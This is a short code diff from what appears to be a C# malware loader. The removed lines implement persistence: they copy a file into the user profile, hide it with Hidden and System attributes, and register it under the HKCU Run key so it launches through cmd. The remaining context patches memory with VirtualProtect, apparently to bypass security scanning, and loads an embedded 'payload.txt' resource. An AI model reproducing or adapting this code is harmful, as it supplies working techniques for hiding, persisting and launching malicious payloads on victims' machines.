@@ -57,20 +57,6 @@ namespace namepace_name
             VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);
 #endif
 
-#if STARTUP
-            string filepath = Path.ChangeExtension(Process.GetCurrentProcess().MainModule.FileName, null);
-            string filecontent = File.ReadAllText(filepath);
-            string startuppath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\" + Path.GetFileName(filepath);
-            if (File.Exists(startuppath))
-            {
-                File.SetAttributes(startuppath, FileAttributes.Normal);
-                File.Delete(startuppath);
-            }
-            File.WriteAllText(startuppath, filecontent);
-            File.SetAttributes(startuppath, FileAttributes.Hidden | FileAttributes.System);
-            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", Path.GetFileName(startuppath), "cmd /c \"" + startuppath + "\"");
-#endif
-
             Assembly asm = Assembly.GetExecutingAssembly();
             StreamReader reader = new StreamReader(asm.GetManifestResourceStream("payload.txt"));
             string payload = reader.ReadToEnd();
